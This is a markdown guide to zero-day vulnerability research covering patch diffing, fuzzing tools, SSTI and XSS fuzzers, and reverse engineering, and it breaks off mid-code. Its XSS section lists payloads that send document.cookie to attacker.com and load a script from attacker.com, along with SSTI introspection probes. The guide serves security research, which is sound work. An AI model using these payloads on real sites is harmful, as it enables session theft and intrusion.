# 0-Day Deep Analysis

A comprehensive methodology for zero-day vulnerability research, patch diffing, fuzzing, reverse engineering, exploit development, and responsible disclosure. This document covers the full lifecycle of finding and weaponizing previously unknown vulnerabilities in the context of bug bounty hunting and authorized security research.

## Table of Contents

1. [Introduction & Philosophy](#introduction--philosophy)
2. [Vulnerability Research Methodology](#vulnerability-research-methodology)
3. [Patch Diffing & Regression Analysis](#patch-diffing--regression-analysis)
4. [Fuzzing Strategies](#fuzzing-strategies)
5. [Reverse Engineering for Bug Discovery](#reverse-engineering-for-bug-discovery)
6. [Web 0-Day Patterns](#web-0-day-patterns)
7. [Exploit Development](#exploit-development)
8. [Responsible Disclosure](#responsible-disclosure)
9. [Getting Paid for 0-Days](#getting-paid-for-0-days)
10. [Toolkit & Automation](#toolkit--automation)
11. [Checklist](#checklist)

---

## Introduction & Philosophy

### What Defines a 0-Day in a Bug Bounty Context

A 0-day vulnerability is any security flaw that is **unknown to the vendor** and **lacks a public fix or advisory** at the time of discovery. In bug bounty hunting, the term extends to include:

| Category | Definition | Example |
|----------|------------|---------|
| Unpatched vuln | Vendor is aware but has not released a fix | Bug found in latest version of Flask |
| Undisclosed CVE | CVE reserved but no public details | Finding matching a reserved CVE pattern |
| Novel attack chain | Each component is known, but the combination is new | XSS + cache poisoning + CSRF token theft |
| Patch gap | Fix exists but is incomplete | One-day after patch analysis reveals bypass |
| Logic 0-day | Implementation flaw not covered by any CVE | Business logic race condition in a SaaS platform |

**Key distinction:** In a traditional vulnerability research context, 0-days are typically memory corruption or pre-auth RCE in widely deployed software. In a bug bounty context, 0-days can be application-level logic flaws that the vendor's security team hasn't seen before — and that no other hunter has reported.

### Why 0-Day Hunting Is Different from Standard Bug Bounty

| Dimension | Standard Bug Bounty | 0-Day Hunting |
|-----------|---------------------|---------------|
| Time investment | Minutes to hours | Days to weeks |
| Tooling | Burp, ffuf, nuclei | IDA Pro, Ghidra, AFL++, Boofuzz |
| Skillset | HTTP, auth, business logic | Assembly, reversing, binary exploitation |
| Competition | Hundreds of hunters on same target | Near-zero competition |
| Payout | $500 - $10,000 | $5,000 - $500,000+ |
| Certainty | High (known patterns) | Low (unknown if exploitable) |
| Reusability | Low (target-specific) | High (CVE follows the software) |

**The math:** One 0-day sold through ZDI or directly to a vendor at $50,000 can equal 50 standard bug bounty findings. But the failure rate is higher, and the research time is measured in weeks, not hours.

### The 0-Day Hunter Mindset

Three cognitive frameworks separate successful 0-day hunters from standard bug bounty hunters:

#### Developer Psychology

Ask yourself: *"What did the developer assume would never happen?"*

```
Developers assume:
- Input validation is sufficient (it almost never is)
- UUIDs are unguessable (they leak everywhere)
- Internal APIs are unreachable (they're proxied by accident)
- Edge cases won't be hit (they're the entire attack surface)
- Dependencies are secure (they have their own bugs)
```

Every assumption is a potential 0-day. The developer's mental model of "safe inputs" defines the boundary you need to cross.

#### Anomaly Detection

Train yourself to notice when something doesn't match the pattern:

```
Normal: POST /api/document → 201 Created
Normal: GET  /api/document/123 → 200 OK
Normal: POST /api/document/999 → 404 Not Found

Anomaly:  POST /api/document → 202 Accepted (async processing!)
Anomaly:  GET  /api/document/123 → 403 Forbidden (blocked by WAF?)
Anomaly:  POST /api/document/999 → 500 Internal (stack trace leaked!)
```

Each anomaly is a signal. The standard hunter moves past it. The 0-day hunter stops and investigates.

#### What-If Experiments

Replace testing with systematic question-asking:

```
What if I:
- Send a string instead of an integer?
- Send an array instead of a string?
- Send a negative number?
- Send a number larger than 2^31?
- Send an object with extra fields?
- Send the same request twice at the same time?
- Send the request before authentication completes?
- Skip a step in a multi-step workflow?
- Repeat a step in a multi-step workflow?
- Send a request with a null value?
- Send a request with an empty value?
- Send a request with unicode normalization tricks?
```

Run what-if experiments on every parameter, not just the obvious ones.

### Risk/Reward Calculus

Before diving into 0-day research, run this decision matrix:

| Factor | High Reward Signal | Low Reward Signal |
|--------|-------------------|-------------------|
| Software deployment | Internet-facing, widely deployed | Internal-only, niche |
| Attack surface | Pre-auth, no CSRF token, no rate limit | Post-auth, CSRF-protected, rate limited |
| Bug class | Memory corruption, RCE, SQLi pre-auth | XSS post-auth, open redirect |
| Payout history | Google VRP, Microsoft, Apple, ZDI | Small private program |
| Competition | Few researchers target this software | Thousands hunt it (e.g., WordPress core) |
| Research cost | Existing tooling, good documentation | No source code, custom protocol, obfuscated |

**Rule of thumb:** Don't spend more than a week on a target unless you have strong signals. If after 7 days you don't have a crash, a triggerable ASAN report, or a clear attack path, cut losses and move to the next target.

---

## Vulnerability Research Methodology

### CVE Research Workflow

The foundation of 0-day research is knowing what's been found, what's been fixed, and what's been missed.

#### Primary Sources

```
NVD API (nvd.nist.gov)
  ├─ https://services.nvd.nist.gov/rest/json/cves/2.0
  ├─ Search by: keywordSearch, cvssScore, lastModStartDate
  └─ Query pattern: /rest/json/cves/2.0?keywordSearch=nginx+1.24&cvssScore=7

GitHub Security Advisories
  ├─ https://github.com/advisories
  ├─ Filter by: ecosystem, severity
  └─ GitHub Advisory Database (GHSA-* identifiers)

Exploit-DB
  ├─ https://www.exploit-db.com
  ├─ Search by: EDB-ID, CVE, author, type
  └─ searchsploit command-line tool

Packet Storm
  ├─ https://packetstormsecurity.com
  └─ Full disclosure archives

Qualitative Memory Correlation
  ├─ "I remember a similar bug in Apache httpd 2.4.49"
  ├─ "This pattern looks like the File Upload logic bug from 2023"
  └─ Experience-based pattern matching
```

#### Automated CVE Monitoring

```python
#!/usr/bin/env python3
import requests
import json
from datetime import datetime, timedelta

def monitor_nvd(days_back=1, keywords=None):
    """Fetch recent CVEs from NVD API."""
    since = (datetime.now() - timedelta(days=days_back)).isoformat()
    params = {
        'lastModStartDate': since,
        'resultsPerPage': 100
    }
    
    resp = requests.get(
        'https://services.nvd.nist.gov/rest/json/cves/2.0',
        params=params
    )
    
    if resp.status_code != 200:
        return []
    
    data = resp.json()
    results = []
    
    for vuln in data.get('vulnerabilities', []):
        cve = vuln.get('cve', {})
        cve_id = cve.get('id')
        desc = cve.get('descriptions', [{}])[0].get('value', '')
        
        # Filter by keywords
        if keywords:
            if not any(k.lower() in desc.lower() for k in keywords):
                continue
        
        results.append({
            'cve_id': cve_id,
            'description': desc,
            'cvss_score': cve.get('metrics', {}).get('cvssMetricV31', [{}])[0]
                          .get('cvssData', {}).get('baseScore', 'N/A'),
            'published': cve.get('published'),
            'last_modified': cve.get('lastModified')
        })
    
    return results

# Usage: monitor_nvd(keywords=['nginx', 'apache', 'openssl', 'keepalived'])
```

#### Query Patterns by Product

| Product | NVD Query String | Exploit-DB Query |
|---------|-----------------|------------------|
| Nginx | `cpe:2.3:a:nginx:nginx` | `nginx remote` |
| Apache httpd | `cpe:2.3:a:apache:http_server` | `apache httpd` |
| OpenSSL | `cpe:2.3:a:openssl:openssl` | `openssl` |
| jQuery | `cpe:2.3:a:jquery:jquery` | `jquery` |
| Django | `cpe:2.3:a:djangoproject:django` | `django` |
| WordPress | `cpe:2.3:a:wordpress:wordpress` | `wordpress` |
| Redis | `cpe:2.3:a:redis:redis` | `redis` |
| nginx-ingress | `cpe:2.3:a:kubernetes:ingress-nginx` | `nginx ingress` |
| Express.js | Search: `express.js CVE` | `express` |
| Flask | `cpe:2.3:a:palletsprojects:flask` | `flask` |

### EPSS Scoring for Prioritization

The Exploit Prediction Scoring System (EPSS) tells you the probability that a CVE will be exploited in the wild within 30 days.

```
EPSS Score Range  →  Interpretation
─────────────────────────────────────
0.0  - 0.01      →  Very unlikely to be exploited
0.01 - 0.1       →  Low probability
0.1  - 0.5       →  Moderate probability
0.5  - 0.9       →  High probability — likely being targeted
0.9  - 1.0       →  Almost certainly being exploited

API: https://api.first.org/data/v1/epss?cve=CVE-2024-XXXXX
Batch: https://api.first.org/data/v1/epss?cve=CVE-2024-0001,CVE-2024-0002
```

**When to use EPSS:**
- Prioritizing which CVEs to analyze for one-day exploit development
- Deciding whether to invest time reverse-engineering a patch
- Triaging a list of vulnerabilities during a red team engagement

**EPSS threshold for action:** If EPSS > 0.05 and the product is internet-facing, invest at least one day analyzing the patch. If EPSS > 0.3, there's likely already a working exploit in the wild — get your one-day exploit ready before competitors do.

### CISA KEV Cross-Reference

The CISA Known Exploited Vulnerabilities catalog lists vulnerabilities that have been confirmed exploited in the wild.

```
KEV API: https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json

Check for:
- Is this CVE on the KEV list?
- Was it added before or after the patch was released?
- How long was the window between patch and exploitation?
```

**Pattern to watch:** CVEs that are on the KEV list but don't have public PoCs. This means someone has an exploit but hasn't published it — the patch is your best bet for reverse-engineering it yourself.

### GitHub Commit Log Archeology

The single most effective technique for finding 0-days is analyzing security fixes in open-source repositories.

#### Finding Security Fixes

```bash
# Look for commits with security-related keywords
git log --all --oneline --grep="security" --since="2026-01-01"
git log --all --oneline --grep="CVE" --since="2026-01-01"
git log --all --oneline --grep="vulnerability" --since="2026-01-01"
git log --all --oneline --grep="DoS" --since="2026-01-01"
git log --all --oneline --grep="overflow" --since="2026-01-01"
git log --all --oneline --grep="injection" --since="2026-01-01"
git log --all --oneline --grep="XSS" --since="2026-01-01"
git log --all --oneline --grep="CRLF" --since="2026-01-01"
git log --all --oneline --grep="infinite loop" --since="2026-01-01"

# Commits that fix issues labeled with security tags
git log --all --oneline --grep="fix" --since="2026-01-01" | head -100
```

#### Identifying Security-Relevant Commits from Vague Messages

Developers often avoid security keywords in commit messages to delay disclosure. Look for these patterns:

```
Vague messages that often hide security fixes:
  "Improve input validation"         → Likely injection fix
  "Add boundary check"               → Likely overflow fix
  "Handle edge case"                 → Likely logic bug fix
  "Fix crash on malformed input"     → Likely DoS or memory corruption
  "Update parsing logic"             → Likely protocol-level bug
  "Sanitize user-provided data"      → Likely injection fix
  "Better error handling"            → Likely info leak fix
  "Refactor authentication flow"     → Likely auth bypass fix
  "Limit resource consumption"       → Likely DoS fix
  "Prevent race condition"           → Likely TOCTOU fix
  "Add missing null check"           → Likely null dereference or UAF
  "Improve memory management"        → Likely use-after-free or leak
  "Hardened against pathological input" → Likely algorithmic complexity attack
```

#### Diff Analysis Workflow

```bash
# Step 1: Find a suspicious commit
git log --oneline --all --grep="Handle edge case"

# Step 2: Get the full diff
git show <commit-hash> --stat           # See what files changed
git show <commit-hash>                  # See the full diff

# Step 3: Check if it was backported to stable branches
git branch --contains <commit-hash>     # Which branches have this fix?
git log --oneline <stable-branch> --grep="fix"  # Check stable branch

# Step 4: Find the original vulnerable code
git show <commit-hash>^:path/to/file   # The file before the fix

# Step 5: Trace when the vulnerable code was introduced
git log -S "vulnerable_pattern" -- path/to/file  # Find when it was added
git blame path/to/file                          # Who introduced it?
```

#### Backport Detection

The most common mistake is patching only in the development branch without backporting to stable releases.

```bash
# Check if the fix is in the latest stable release tag
git log --oneline v2.4.58..v2.4.59 --grep="security"

# If the fix is NOT in the stable release tag but IS in main:
#    → The stable release is still vulnerable
#    → You have found a one-day that affects the stable release

# Example: fix in main branch at abc123, but stable branch v2.4.x doesn't have it
git merge-base --is-ancestor abc123 v2.4.59-stable
echo $?  # Returns 1 if not merged = vulnerable stable
```

### Release Notes Diffing

Security fixes are often mentioned vaguely in release notes. Compare minor version bumps:

```
Nginx 1.24.0 → 1.25.0:
  "Various bugfixes"                → Check git log
  "Improved handling of upstream"   → Possible proxy bypass fix
  "Security improvements"           → Direct disclosure

OpenSSL 3.0.12 → 3.0.13:
  "Fixed low severity issue"        → Check commit messages
  "Patch for CVE-2024-XXXX"         → Direct CVE reference after embargo

Apache httpd 2.4.58 → 2.4.59:
  "Fix for possible crash"          → Likely DoS or memory corruption
  "Security: Fix for CVE-2024-XXXX" → Direct reference
```

**Workflow:**
1. Subscribe to release notification feeds (GitHub releases, mailing lists, RSS)
2. When a new patch release drops, immediately diff against the previous release
3. Look for files in security-sensitive directories (auth, crypto, parser, ssl, filter)
4. Analyze every changed function for the root cause

---

## Patch Diffing & Regression Analysis

### Binary Diffing Tools

When source code is unavailable (proprietary software, embedded firmware), binary diffing is the only option.

#### Diaphora (IDA Pro / Ghidra)

Diaphora is the most advanced binary diffing plugin. It performs:

- **Function matching** (name, hash, graph, call-graph isomorphism)
- **Basic block matching** (instructions, CFG, bytes)
- **Pseudocode matching** (decompiler output comparison)
- **Assembly-level diffing** (mnemonic, operand, flow)

```
Workflow:
1. Load patched binary in IDA/Ghidra → Export .SQLite database
2. Load unpatched binary → Export .SQLite database
3. Run Diaphora: File → Load Database → Compare
4. Filter results: Show only "Modified" or "Removed" functions
5. Focus on security-relevant functions:
     - Parser functions (JSON, XML, HTTP, protocol)
     - Memory management functions (malloc, free, realloc)
     - Auth/token validation functions
     - Input sanitization functions
     - Boundary check functions
```

#### Bindiff (Zynamics / Google)

Bindiff focuses on speed and scale:

```
bindiff --primary patched_binary.i64 --secondary unpatched_binary.i64
       --output results.Bindiff

Key metrics:
- Similarity (0.0-1.0): How similar two matched functions are
- Confidence (0.0-1.0): How reliable the match is
- Size change: Indicates added/removed functionality
- Algorithm change: Indicates rewritten logic
```

**Bindiff match types to investigate:**

| Match Type | Meaning | Priority |
|------------|---------|----------|
| Unchanged | Same function in both | None |
| Changed (similar) | Minor modifications | Medium |
| Changed (dissimilar) | Significant changes | High |
| Removed | Function only in old binary | High |
| Added | Function only in new binary | Critical |
| Merged | Two+ functions combined | Medium |
| Split | One function split into multiple | Medium |

#### Ghidra PatchDiff

For Ghidra users without access to IDA Pro:

```
1. Import patched binary → Auto-analyze
2. Import unpatched binary → Auto-analyze to same base address
3. Program Differences tool:
     - Tools → Program Differences
     - Select files: patched vs unpatched
4. Focus on:
     - Instruction differences (opcode changes)
     - Data differences (constant changes)
     - Label differences (new/changed symbols)
```

### Source-Level Diffing

When source code is available, source-level diffing is faster and more precise.

#### Git-Based Diffing

```bash
# Compare two tags
git diff v1.0.0 v1.0.1 -- security-sensitive-path/

# Compare commit ranges
git diff abc123..def456 -- src/

# Single file across versions
git show <fix-commit> -- src/http/ngx_http_parser.c

# Get only the diff stat
git diff --stat v1.0.0 v1.0.1 -- src/
```

#### GitHub Compare URLs

```bash
# Direct comparison between release tags
https://github.com/nginx/nginx/compare/release-1.24.0...release-1.25.0

# Comparison of a specific file
https://github.com/nginx/nginx/compare/release-1.24.0...release-1.25.0#diff-abc123

# Ranges of commits
https://github.com/openssl/openssl/compare/OpenSSL_1_1_1t...OpenSSL_1_1_1u
```

#### Identifying the Actual Fix Among Noise

Patch releases often contain dozens of changes. Find the security-relevant one:

```bash
# Filter by directory (focus on security-critical modules)
git diff tag1 tag2 -- src/http/ src/core/ src/event/ src/ssl/

# Look for very small diffs — security fixes are often 1-5 lines
git diff tag1 tag2 --stat | sort -k2 -n | head -20

# Look for diffs that add validation/checking
git diff tag1 tag2 | grep -E '^\+.*if\s*\(' | grep -iv 'debug\|log\|trace'

# Look for diffs that change sizeof, malloc, strlen patterns
git diff tag1 tag2 | grep -E '^[+-].*(sizeof|malloc|realloc|strlen|strcpy)'

# Look for diffs that remove functions
git diff tag1 tag2 --diff-filter=D --name-only
```

### One-Day Exploit Development from Patch Analysis

Once you've identified the security fix, understand the vulnerability enough to write an exploit:

```
Patch Analysis → Vulnerability Understanding → Exploit
     │                     │                       │
     ▼                     ▼                       ▼
  What changed?        What was missing?        How to trigger?
  ┌─────────────────┐  ┌─────────────────┐    ┌─────────────────┐
  │ Before:          │  │ No bounds check  │    │ Send long input  │
  │   memcpy(buf,    │  │ on user input    │    │ to vulnerable    │
  │   user_input,    │  │ allows overflow  │    │ endpoint         │
  │   strlen(input)) │  │ into stack buf   │    │                  │
  │ After:           │  │                  │    │                  │
  │   size_t len =   │  │ Fix: Added       │    │                  │
  │   min(strlen(in),│  │ length cap       │    │                  │
  │   sizeof(buf)-1);│  │ before copy      │    │                  │
  │   memcpy(buf,    │  │                  │    │                  │
  │   user, len)     │  │                  │    │                  │
  └─────────────────┘  └─────────────────┘    └─────────────────┘
```

#### Exploit Development Timeline After Patch Release

```
Day 0: Patch released → You begin analysis
Day 1: Diff identifies fix → Vulnerability understood
Day 2: Crash reproduction → Exploit primitive identified
Day 3-5: Exploit development → Working PoC against patched version
Day 6-7: Weaponing → Reliable exploit against unpatched versions
```

### Real-World Patch Analysis Patterns

#### Nginx

```c
// Typical nginx security fix pattern:
// Before (vulnerable):
ngx_int_t
ngx_http_parse_request_line(ngx_http_request_t *r, ngx_buf_t *b)
{
    u_char  ch, *p;
    // ... extensive parsing logic
    // Missing boundary check in HTTP method parsing
    if (ch == CR || ch == LF) {
        // Missing: check if we've exceeded method buffer
        r->method_name.len = p - r->method_name.data;
        ...
    }
}

// After (fixed): Added boundary checks throughout parser
// Look for added: size checks, NULL checks, integer overflow guards
```

**Common nginx 0-day patterns:**
- HTTP/2 frame parsing boundary issues
- Request body buffering race conditions
- DNS resolver buffer management (CVE-2021-23017 pattern)
- MP4 module memory corruption
- Rewrite module regex overflow

#### Apache httpd

```c
// Typical Apache security fix pattern:
// Before:
static int ap_core_input_filter(ap_filter_t *f, ...)
{
    // Reads request body without length validation
    // Missing: check for Content-Length > configured limit
    apr_bucket_brigade *bb = f->c->bucket_alloc;
    APR_BRIGADE_INSERT_TAIL(bb, apr_bucket_read(...));
}

// After: Added length cap and error handling
// Look for: AP_MAX_MEM_KB, ap_limit_req_body changes
```

**Common Apache 0-day patterns:**
- HTTP/2 request smuggling (CVE-2024-24795 pattern)
- mod_rewrite SSRF
- mod_proxy URL normalization bypass
- .htaccess bypass
- mod_jk path traversal

#### OpenSSL

```c
// Typical OpenSSL security fix pattern:
// Before:
int tls_construct_client_hello(SSL *s, ...)
{
    // Constructs handshake message
    // Missing: check that session_id length doesn't exceed buffer
    memcpy(p, s->session->session_id, s->session->session_id_length);
    p += s->session->session_id_length;
}

// After: Added length validation before copy
// Look for: explicit length checks, data validation functions
```

**Common OpenSSL 0-day patterns:**
- Certificate parsing overflows (CVE-2022-3602 pattern)
- ASN.1 type confusion
- Diffie-Hellman parameter validation
- X.509 name constraint bypass
- TLS handshake state machine issues

#### jQuery

```javascript
// Typical jQuery security fix pattern:
// Before:
function buildFragment(elems, context, scripts, selection, ignored) {
    // Parses HTML from user input
    // Missing: sanitization of <script>, <style>, event handlers
    return jQuery.parseHTML(elems, context, true);
}

// After: Added HTML sanitization
// Look for: added .text() usage instead of .html(), DOMPurify integration
```

**Common jQuery 0-day patterns:**
- DOM XSS via .html() injection (CVE-2020-11023 pattern)
- Prototype pollution via $.extend (CVE-2019-11358 pattern)
- Selector injection
- Script execution in parseHTML

---

## Fuzzing Strategies

### File Format Fuzzing

#### libFuzzer

```c
// libfuzzer harness for a JSON parser
#include <stdint.h>
#include <stddef.h>

extern int parse_json(const uint8_t *data, size_t size);

int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
    parse_json(data, size);
    return 0;
}
```

```
Build: clang -fsanitize=fuzzer,address fuzz_harness.c -o fuzzer
Run:   ./fuzzer -max_len=4096 -jobs=4 corpus/
```

#### AFL++

```bash
# Build target with AFL++ instrumentation
afl-cc -o vulnerable_program vulnerable.c

# Fuzz with initial corpus
afl-fuzz -i corpus/ -o findings/ -- ./vulnerable_program @@

# Key parameters:
#   -i corpus/       : Directory with valid input samples
#   -o findings/     : Output directory for crashes
#   -m none          : No memory limit
#   -t 5000          : Timeout per test case
#   @@               : AFL replaces with input file path
```

#### Honggfuzz

```bash
# Honggfuzz with ASAN
honggfuzz --input corpus/ --output findings/ -- \
    ./vulnerable_program ___FILE___

# With sanitizers
honggfuzz --sanitizers --input corpus/ -- \
    ./vulnerable_program ___FILE___
```

#### Corpus Generation Strategies

| Strategy | Description | Best For |
|----------|-------------|----------|
| Seed from valid files | Start with legitimate inputs | XML, JSON, image parsers |
| Mutation from existing corpuses | Use known-good corpus sets (OSS-Fuzz, FuzzBench) | General purpose |
| Grammar-based generation | Define input structure rules | Protocol parsers, config files |
| Random byte streams | No prior knowledge required | Simple parsers, initial pass |
| Coverage-guided | Use coverage feedback to direct mutations | Complex parsers with many branches |
| Dictionary-enhanced | Add known keywords to mutation pool | Protocol fuzzers (e.g., HTTP headers) |

### Network Protocol Fuzzing

#### Boofuzz

```python
#!/usr/bin/env python3
from boofuzz import *

def test_http_request(target, fuzz_data_logger, session, node, edge):
    """Fuzz HTTP/1.1 request line."""
    request = Request("http-request")
    
    request.add_static("GET /")
    request.add_string("path", fuzzable=True, max_len=4096)
    request.add_static(" HTTP/1.1\r\n")
    request.add_static("Host: ")
    request.add_string("host", fuzzable=True, max_len=256)
    request.add_static("\r\n")
    request.add_delim("header-delimiter", fuzzable=True)
    request.add_static("Content-Length: ")
    request.add_delim("content-length", fuzzable=True)
    request.add_static("\r\n\r\n")
    request.add_string("body", fuzzable=True, max_len=65536)
    
    session.add_session("tcp", target=target)
    session.connect(request)
    session.fuzz()

if __name__ == "__main__":
    target = Target(connection=TCPSocketConnection("127.0.0.1", 8080))
    test_http_request(target, None, None, None, None)
```

#### Peach (Pit-based fuzzing)

```xml
<!-- Peach pit file for HTTP/2 fuzzing -->
<Peach xmlns="http://peachfuzzer.com/2012/Peach">
    <DataModel name="Http2Frame">
        <Number name="Length" size="24" />
        <Number name="Type" size="8" />
        <Number name="Flags" size="8" />
        <Number name="StreamId" size="31" >
            <Fixup class="StreamIdFixup" />
        </Number>
        <Blob name="Payload" />
    </DataModel>
    
    <StateModel name="Http2State" initialState="Connection">
        <State name="Connection">
            <Action type="output">
                <DataModel ref="Http2Preface" />
            </Action>
            <Action type="output">
                <DataModel ref="Http2Settings" />
            </Action>
            <Action type="input">
                <DataModel ref="Http2Settings" />
            </Action>
            <Action type="changeState" ref="Established" />
        </State>
        <State name="Established">
            <Action type="output">
                <DataModel ref="Http2Frame" />
            </Action>
        </State>
    </StateModel>
    
    <Agent name="LocalAgent">
        <Monitor class="Debugger">
            <Param name="CommandLine" value="target_server.exe" />
        </Monitor>
    </Agent>
</Peach>
```

### API Fuzzing

#### RESTler (Microsoft)

```bash
# Generate RESTler config from Swagger/OpenAPI spec
restler.exe compile --api-spec petstore.yaml

# Fuzz the API
restler.exe fuzz --grammar Compile/grammar.py --settings settings.json

# Key RESTler features:
# - Swagger/OpenAPI based grammar generation
# - Consumer/producer dependency tracking
# - Bucket-based fuzzing (1. check basic, 2. exhaustive, 3. bug-specific)
# - Respose code analysis for bugs
```

#### Schemathesis

```python
#!/usr/bin/env python3
import schemathesis

# Load API schema
schema = schemathesis.from_uri("https://api.example.com/openapi.json")

# Run fuzzing campaign
@schema.parametrize()
def test_api(case):
    response = case.call()  # Makes the actual HTTP request
    case.validate_response(response)
    
    # Check for data leakage across users
    if response.status_code == 200:
        data = response.json()
        for key in data:
            if isinstance(data[key], str) and len(data[key]) > 100:
                print(f"Potential data leak: {key} with length {len(data[key])}")

# Run with pytest
# $ pytest test_api_fuzz.py -v --max-examples=1000
```

### Browser/JS Fuzzing

#### DOM Clobbering Discovery

```javascript
// Test for DOM clobbering opportunities
const vectors = [
    '<a id="config"></a>',
    '<form name="config"><input name="api_key"></form>',
    '<img name="user" id="user">',
    '<object id="config" data="javascript:alert(1)">',
    '<embed id="config" src="data:text/html,...">'
];

// Fuzz sandbox attribute removal
const iframeConfigs = [
    '<iframe srcdoc="...">',
    '<iframe srcdoc="..." sandbox="">',
    '<iframe srcdoc="..." sandbox="allow-scripts">',
    '<iframe srcdoc="..." sandbox="allow-scripts allow-same-origin">'
];
```

#### XSS Filter Bypass Discovery

```javascript
// Mutation-based XSS filter fuzzer
function generateMutations(base) {
    const mutations = [];
    const encodings = [
        s => s,                          // Original
        s => s.toUpperCase(),            // Upper
        s => s.toLowerCase(),            // Lower
        s => s.replace(/</g, '\\x3c'),   // Hex
        s => s.replace(/</g, '\\u003c'), // Unicode
        s => s.replace(/</g, '&#60;'),   // HTML entity
        s => s.replace(/</g, '&#x3c;'),  // Hex entity
        s => s.replace(/a/g, '\\a'),     // Escape
        s => s.replace(/"/g, '\\"'),     // Quote escape
        s => s.replace(/"/g, '&quot;'),  // Quote entity
    ];
    
    const wrappers = [
        s => `<script>${s}<\/script>`,
        s => `<img src=x onerror="${s}">`,
        s => `<svg onload="${s}">`,
        s => `<body onload="${s}">`,
        s => `<input autofocus onfocus="${s}">`,
        s => `<details ontoggle="${s}">`,
        s => `<iframe srcdoc="${s}">`,
        s => `{{${s}}}`,                    // SSTI probe
        s => `${{s}}`,                      // JS template literal
    ];
    
    for (const encode of encodings) {
        for (const wrap of wrappers) {
            mutations.push(wrap(encode(base)));
        }
    }
    return mutations;
}

const payloads = [
    'alert(1)',
    'fetch("https://attacker.com/?"+document.cookie)',
    'import("//attacker.com/xss.js")',
    'eval(atob("YWxlcnQoMSk="))'
];
```

### Grammar-Based Fuzzing for Template Engines

```python
# Grammar-based SSTI fuzzer
import random

class TemplateGrammarFuzzer:
    def __init__(self):
        self.expressions = [
            "{{7*7}}",
            "{{7*'7'}}",
            "{{config}}",
            "{{self}}",
            "{{_}}",
            "{{''.__class__.__mro__}}",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            "${7*7}",
            "#{7*7}",
            "*{7*7}",
            "{{#with \"s\" as |string|}}",
            "{{#each}}",
            "{{=7*7}}",
            "{% if 1==1 %}yes{% endif %}",
            "<%= 7*7 %>",
            "<?= 7*7 ?>",
        ]
        
        self.delimiters = [
            ("{{", "}}"),
            ("{%", "%}"),
            ("${", "}"),
            ("#{", "}"),
            ("*{", "}"),
            ("<%=", "%>"),
            ("<?=", "?>"),
            ("{{=", "}}"),
        ]
        
    def generate_templates(self, engine_signatures):
        """
        Generate test templates based on detected engine.
        engine_signatures: list of strings like 'jinja2', 'twig', 'freemarker'
        """
        templates = []
        
        # Math detection probes
        for delim_open, delim_close in self.delimiters:
            templates.append(f"{delim_open}7*7{delim_close}")
            templates.append(f"{delim_open}7*'7'{delim_close}")
        
        # Object introspection probes
        templates.extend(self.expressions)
        
        # Blind detection probes (callback-based)
        templates.append("{{7*7}}")
        templates.append("${7*7}")
        templates.append("${{7*7}}")
        
        return templates
    
    def mutate_template(self, template):
        """Apply random mutations to a template string."""
        mutations = [
            lambda s: s.upper(),
            lambda s: s.lower(),
            lambda s: s.replace("{{", "{%"),
            lambda s: s.replace("}}", "%}"),
            lambda s: s + "\n",
            lambda s: s + " ",
            lambda s: s.replace("7", "99999999999999999999"),
        ]
        return random.choice(mutations)(template)
```

### Crash Triage and Minimization

```bash
# AFL crash exploration
afl-analyze -i crash_file -- ./vulnerable_program

# Crash minimization with AFL
afl-tmin -i crash_file -o minimized_crash -- ./vulnerable_program @@

# LibFuzzer crash minimization
./fuzzer -minimize_crash=1 -runs=100000 crash_file

# Manual crash verification with GDB
gdb -batch -ex "run < crash_file" -ex "bt" ./vulnerable_program

# With ASAN stack trace
./vulnerable_program < crash_file 2>&1 | head -50
```

### Coverage-Guided vs Generation-Based Approaches

| | Coverage-Guided | Generation-Based |
|---|---|---|
| **How it works** | Uses code coverage feedback to evolve inputs | Generates inputs based on grammar/model |
| **Tool examples** | AFL++, libFuzzer, Honggfuzz | Peach, boofuzz, SPIKE |
| **Best for** | Binary parsers, libraries, file formats | Protocol implementations, stateful fuzzing |
| **Initial setup** | Requires instrumented binary + corpus | Requires protocol/data model definition |
| **Coverage depth** | High for reachable code | Limited to grammar-defined paths |
| **State tracking** | No (stateless per input) | Yes (state machines) |
| **Crash quality** | High (deep exploration of path) | Medium (grammar limits exploration) |

**Practical approach:** Use coverage-guided fuzzing for file format parsing and simple binary libraries. Use generation-based fuzzing for network protocols and stateful applications. Combine both for maximum coverage: use generation-based to reach deep states, then coverage-guided to explore variations within each state.

---

## Reverse Engineering for Bug Discovery

### Static Analysis Workflow

#### Ghidra

```
1. Import Binary
   File → Import File → Select binary
   Options: Load as PE/ELF/RAW
   
2. Auto-Analyze
   Analysis → Auto Analyze
   Options: Apply all analyzers, aggressive instruction finding
   
3. Identify Target Functions
   Symbol Tree → Exports → Look for security-relevant names
   Functions → Sort by size (small functions = potential bugs)
   
4. Decompile
   Select function → F (Decompile)
   Look for: strcpy, sprintf, gets, memcpy with user-controlled size
   
5. Data Flow Analysis
   Select variable → Ctrl+Shift+F → Show all references
   Trace user input through the function
   
6. Cross-Reference Analysis
   Right-click → References → Show references to
   Find all callers of potentially vulnerable functions
```

#### IDA Pro

```
1. Loading
   File → Load file → PE/ELF/Mach-O
   
2. Initial Analysis
   Options → General → Analysis → Aggressive
   
3. Function Identification
   View → Open subviews → Functions (Alt+1)
   Sort by: Size, Complexity, Proximity to user input
   
4. Key IDA Features for 0-Day Research:
   - Hex-Rays decompiler (F5)
   - Stack variables analysis
   - FLIRT signature matching
   - IDAPython automation
   - Lumina server for function matching
```

#### radare2 / rizin

```bash
# Load and analyze
r2 -A vulnerable_binary

# Basic analysis
[0x100001000]> aaaa               # Full analysis
[0x100001000]> afl                # List all functions
[0x100001000]> afl~size:20        # Functions with small size
[0x100001000]> s <function_addr>  # Seek to function
[0x100001000]> VV                 # View graph
[0x100001000]> pdg                # Decompile (requires r2dec or Ghidra)
[0x100001000]> V                  # Visual mode
[0x100001000]> axt @ str.failed   # Cross-reference to string
```

### Dynamic Analysis

#### Frida

```javascript
// Frida hook to intercept potentially vulnerable function
// save as hook.js

// Hook malloc to track size
const malloc = Module.findExportByName("libc.so.6", "malloc");
Interceptor.attach(malloc, {
    onEnter: function(args) {
        this.size = args[0];
        console.log(`malloc(${this.size}) from:\n` +
                     Thread.backtrace(this.context, Backtracer.ACCURATE)
                     .map(DebugSymbol.fromAddress).join('\n'));
    },
    onLeave: function(retval) {
        console.log(`malloc(${this.size}) = ${retval}`);
    }
});

// Hook memcpy to detect overflow
const memcpy = Module.findExportByName("libc.so.6", "memcpy");
Interceptor.attach(memcpy, {
    onEnter: function(args) {
